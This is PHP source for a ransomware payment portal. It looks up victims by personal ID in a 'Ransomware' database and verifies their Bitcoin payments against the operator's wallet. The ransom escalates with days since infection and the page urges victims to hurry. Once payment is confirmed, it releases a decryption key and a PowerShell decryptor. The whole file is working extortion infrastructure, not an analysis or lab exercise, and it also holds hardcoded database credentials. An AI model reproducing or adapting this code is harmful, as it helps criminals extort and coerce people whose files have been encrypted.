<?php
  require("common.php");

  $servername = "localhost";
  $username = "ziog";
  $password = "admin";
  $db = "Ransomware";

  $conn = new mysqli($servername, $username, $password, $db);
  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
  }
  $guid = $conn -> real_escape_string($_POST["guid"]);
  $trx = $conn -> real_escape_string($_POST["trx"]);
  $msg = $conn -> real_escape_string($_POST["msg"]);

  if(empty($guid)){
    echo "<p>Provide a valid Personal ID!<p>";
    exit();
  }

  $stmt = $conn->prepare("SELECT * FROM Data WHERE guid LIKE ?");
  $stmt->bind_param("s", $guid);
  $stmt->execute();
  $result = $stmt->get_result();
  $data = $result->fetch_assoc();

  if(empty($data)){
    echo "Cannot find your personal ID!";
    exit();
  }

  if(!empty($msg)){
    $stmt = $conn->prepare("SELECT count(*) as total FROM Message WHERE guid LIKE ?");
    $stmt->bind_param("s", $guid);
    $stmt->execute();
    $result = $stmt->get_result();
    $messages = $result->fetch_assoc();
    if($messages['total'] < 3){
      $stmt = $conn->prepare("INSERT INTO Message(guid, question) VALUES (?, ?)");
      $stmt->bind_param("ss", $guid, $msg);
      $stmt->execute();
    }
  }

  $stmt = $conn->prepare("SELECT count(*) as total FROM Message WHERE guid LIKE ?");
  $stmt->bind_param("s", $guid);
  $stmt->execute();
  $result = $stmt->get_result();
  $messages = $result->fetch_assoc();
  if($messages['total'] > 0){
    echo "<h2><u>Questions</u></h2>";
    $stmt = $conn->prepare("SELECT * FROM Message WHERE guid LIKE ?");
    $stmt->bind_param("s", $guid);
    $stmt->execute();
    $result = $stmt->get_result();
    while ($row = $result->fetch_assoc()) {
      $question = $row["question"];
      $answer = $row["answer"];
      echo "<p>&nbsp;&nbsp;<u>Question</u>: $question<br>";
      echo "&nbsp;&nbsp;<u>Answer</u>: $answer</p>";
    }
    echo "<hr><hr>";
    echo "<br>";
  }

  if(!empty($trx)){
    $trxInfo = json_decode(file_get_contents('https://blockchain.info/rawtx/' . $trx), true);
    if(empty($trxInfo)){
      echo "The transaction provided has not been found!";
      exit();
    }
    $stmt = $conn->prepare("SELECT * FROM Transaction WHERE id LIKE ?");
    $stmt->bind_param("s", $trx);
    $stmt->execute();
    $result = $stmt->get_result();
    $trxData = $result->fetch_assoc();

    $btcPaid = (array_sum(array_column(array_column($trxInfo["inputs"], "prev_out"), "value"))) /  100000000;
    $walletDest = $trxInfo["out"][0]["addr"];
    if($walletDest != $walletAddr){
      echo "The transaction wallet destination is <b>" . $walletDest . "</b><br>";
      echo "The wallet address you have to pay is <b>" . $walletAddr . "</b>!";
      exit();
    }

    if(empty($trxData)){
      $stmt = $conn->prepare("UPDATE Data SET btc_paid = btc_paid + ? WHERE guid LIKE ?");
      $stmt->bind_param("ds", $btcPaid, $guid);
      $stmt->execute();
      $stmt = $conn->prepare("SELECT * FROM Data WHERE guid LIKE ?");
      $stmt->bind_param("s", $guid);
      $stmt->execute();
      $result = $stmt->get_result();
      $data = $result->fetch_assoc();

      $stmt = $conn->prepare("INSERT INTO Transaction VALUES (?)");
      $stmt->bind_param("s", $trx);
      $stmt->execute();
    }
    $stmt->close();
    $conn->close();      
  }

  $now = strtotime(date("d/m/Y H:i:s"));
  $infected_date = strtotime($data["infected_date"]);
  $daysDiff = round(($now - $infected_date) / (60 * 60 * 24));
  if($daysDiff <= 3){
    $importToPay = $withinThree;
  }
  elseif($daysDiff <= 6){
    $importToPay = $withinSix;
  }
  else{
    $importToPay = $withinTen;
  }
  $btcPaid = $data["btc_paid"];
  $btcToPay = file_get_contents('https://blockchain.info/tobtc?currency=EUR&value=' . $importToPay);

  if($btcPaid < $btcToPay - 0.0025){
    echo "You paid <b>" . htmlspecialchars($btcPaid) . "</b>BTC<br>";
    echo "The total amount to pay to get back your files is <b>" . htmlspecialchars($btcToPay) . "</b>BTC!<br><br>";
    echo "Hurry up, the price is going to raise according to the rules";
    exit();
  }

  $ext = htmlspecialchars($data["ext"]);
  $key = htmlspecialchars($data["key"]);
  echo <<<EOL
    <h1 style="color:red">Congratulations! You are going to have back your files!</h1>
    <h2>Thank you for the support!</h2><br>
    <p>This is you unique decryption key: <b>$key</b></p><br>
  EOL;

  echo <<<EOL
    <p>Follow this instruction to recover your files:</p>
    <ul>
      <li>Open file explorer, go to "visualization" tab on the top border and check "visualize file extension"</li>
      <li>Right click in any folder you prefer, then select new -> text document</li>
      <li>Rename it at "DecryptFiles.ps1". <b>It's important the file has the extension (the 3 chars after .) "ps1"!</b></li>
      <li>If the file has the correct extension, its icon will change. Moreover, if you right click on it there should be displayed the "exec with powershell" option</li>
      <li>Double click on the just created file and paste the following lines:<br>
        <p><b>
          function DecryptFile(\$fileBytes, \$key, \$salt, \$IV){<br>
              \$RijndaelObject = New-Object System.Security.Cryptography.RijndaelManaged<br>
              \$keyBytes = [Text.Encoding]::UTF8.GetBytes(\$key)<br>
              \$saltBytes = [Text.Encoding]::UTF8.GetBytes(\$salt)<br>
              \$RijndaelObject.Key = (New-Object Security.Cryptography.PasswordDeriveBytes \$keyBytes, \$saltBytes, "SHA1", 5).GetBytes(32)<br>
              \$RijndaelObject.IV = (New-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes(\$IV) )[0..15]<br>
              <br>
              \$RijndaelObject.Padding="Zeros"<br>
              \$RijndaelObject.Mode="CBC"<br>
              \$dy = \$RijndaelObject.CreateDecryptor()<br>
              \$ms = New-Object IO.MemoryStream<br>
              \$cs = New-Object Security.Cryptography.CryptoStream \$ms,\$dy,"Write"<br>
              \$cs.Write(\$fileBytes, 0, \$fileBytes.Length)<br>
              \$cs.Close()<br><br>
              \$ms.Close()<br>
              \$RijndaelObject.Clear()<br>
              return \$ms.ToArray()<br>
          }<br>
          <br>
          \$key = "$key";<br>
          \$salt="DREAM hacks you!";<br>
          \$IV="DREAM INIT";<br>
          <br>
          \$drive = Get-PSDrive|Where-Object {\$_.Free -gt 50000}|Sort-Object -Descending;<br>
          foreach(\$folder in \$drive){<br>
            try {<br>
              gci \$folder.root -Recurse -Include "*.$ext" -ErrorAction SilentlyContinue | %{<br>
                try {<br>
                  if( \$_.length -ne 0 ){<br>
                    \$file=[io.file]::Open(\$_, 'Open', 'ReadWrite');<br>
                    if (\$file.Length -lt "40960"){<br>
                      \$bytesToEncode=\$file.Length;<br>
                    }<br>
                    else{<br>
                      \$bytesToEncode="40960";<br>
                    }<br>
                    [byte[]]\$fileBytes = new-object byte[] \$bytesToEncode;<br>
                    \$readFile = \$file.Read(\$fileBytes, 0, \$fileBytes.Length);<br>
                    \$file.Position='0';<br>
                    \$encryptedBytes = DecryptFile \$fileBytes \$key \$salt \$IV;<br>
                    \$file.Write(\$encryptedBytes, 0, \$encryptedBytes.Length);<br>
                    \$file.Close();<br>
                    \$newName = \$_.Name -replace ".$ext", ""<br>
                    try{<br>
                      ren -Path \$(\$_.FullName) -NewName \$newName -Force;<br>
                    }catch{};<br>
                    \$result++;<br><br>
                  }<br>
                }catch{};<br>
              }<br>
            }catch{};<br>
          }<br>
          exit 0
        </b></p>
      </li>
      <li>Right click on the file and select "exec with powershell"</li>
    </ul>
    <p>
      <u>All your files will be decryped</u>
      Depending on the number of files, this process could take some hours to complete
    </p>
  EOL;
?>
